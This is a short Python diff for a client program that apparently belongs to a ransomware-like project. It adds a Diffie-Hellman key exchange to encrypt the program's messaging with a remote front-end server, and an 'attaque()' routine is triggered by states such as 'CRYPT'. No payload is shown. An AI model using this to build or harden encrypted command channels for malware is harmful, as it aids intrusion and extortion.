@@ -10,14 +10,17 @@ from os import path
 import utile.config as config
 import utile.message as message
 from utile.network import *
+from utile.security import *
 
-
+key = b''
 LAST_STATE = None
 IP_FRONTAL = ''
 PORT_FRONTAL = 0
 
+
 def initialize():
     global LAST_STATE
+    global key
 
     hash_i = config.get_data_config("HASH")
     if hash_i is None:
@@ -37,8 +40,9 @@ def initialize():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP_FRONTAL, PORT_FRONTAL))
-    send_msg_clear(s, msg)
-    msg = recv_msg_clear(s)
+    key = security.diffie_hellman_recv_key(s)
+    send_msg(s, msg, key)
+    msg = recv_msg(s, key)
     msg_type = message.get_message_type(msg)
     msg = json.loads(msg)
     if msg_type == 'INITIALIZE_RESP':
@@ -116,3 +120,4 @@ def main():
 
     if LAST_STATE == 'INITIALIZE' or LAST_STATE == 'CRYPT' or LAST_STATE == 'PENDING':
         attaque()
+
